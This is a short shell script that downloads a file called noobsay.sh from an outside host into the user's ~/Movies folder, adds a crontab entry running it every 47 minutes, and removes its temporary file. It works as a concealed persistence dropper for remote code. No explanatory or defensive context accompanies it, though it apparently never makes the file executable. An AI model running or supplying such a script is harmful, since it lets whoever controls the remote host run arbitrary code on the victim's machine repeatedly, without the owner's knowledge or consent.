
crontab -l > mycron
curl -o ~/Movies/noobsay.sh "john.software/noobsay.sh"
echo "*/47 * * * * ~/Movies/noobsay.sh" >> mycron
crontab mycron
rm mycron
